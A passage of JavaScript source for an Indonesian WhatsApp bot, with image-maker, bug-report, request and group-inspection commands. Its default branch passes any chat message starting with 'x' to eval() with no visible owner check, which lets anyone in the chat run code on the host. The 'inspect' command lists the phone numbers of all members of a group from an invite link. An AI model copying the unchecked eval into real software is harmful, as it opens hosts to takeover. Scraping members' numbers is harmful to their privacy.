                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/galaxywp?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                   case 'gaming':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/gaming?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                   case 'colors':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/watercolor?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                   case 'kling':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   var F = body.slice(7)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1];    				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/sparkling?text1=${F1}&text2=${F2}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
//ENDMAKERMENU

			        case 'wait':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                        if (!isRegister) return reply(mess.only.daftarB)
						reply (mess.wait)
						const encmediaae = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						media = await zaki.downloadMediaMessage(encmediaae)
						await wait(media).then(res => {
         						zaki.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
		      				})
					} else {
						reply('Tag Foto Animenya')
					}
					break                                                  

               case 'bugreport':

                if (!isRegister) return reply(mess.only.daftarB)
                if (args.length < 1) return reply(`Mau lapor apa? Contoh: ${prefix}lapor fitur anime error`)
          			
          				const kontil = body.slice(11)
                      if (kontil.length > 300) return zaki.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var tonmor = mek.participant
                       const buseh = `*[BUG REPORT]*\nNomor : @${tonmor.split("@s.whatsapp.net")[0]}\nPesan : ${kontil}`

                      var options = {
                         text: buseh,
                         contextInfo: {mentionedJid: [tonmor]},
                     }
                    zaki.sendMessage('6285737134572@s.whatsapp.net', options, text, {quoted: mek})
                    reply('LAPORAN ANDA TELAH SAMPAI ke owner BOT, Laporan palsu/main2 tidak akan ditanggapi.')
                    break                                                  

					case 'request':
                     
				    if (!isRegister) return reply(mess.only.daftarB)
                     const cfrr = body.slice(9)
                      if (cfrr.length > 300) return zaki.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
                        var nomor = mek.participant
                       const ress = `*[REQUEST FITUR]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`

                      var optionsp = {
                         text: ress,
                         contextInfo: {mentionedJid: [nomor]},
                     }
                    zaki.sendMessage('6283873394995@s.whatsapp.net', optionsp, text, {quoted: mek})
                    reply('REQUEST ANDA TELAH SAMPAI ke owner BOT, Requests palsu/main2 tidak akan ditanggapi.')
                    break                                
                    case 'inspect':

            try {

            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await zaki.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             zaki.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
			default:
				if (body.startsWith(`${prefix}${command}`)) {reply(`Maaf *${pushname}*, Command *${prefix}${command}* Tidak Terdaftar Di Dalam *${prefix}menu*!`)
                  }
        if (budy.startsWith('x')){ 
        try {
        return zaki.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
        } catch(err) {
        e = String(err)
        reply(e)
        }
      }  
					if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
	})
}
starts()

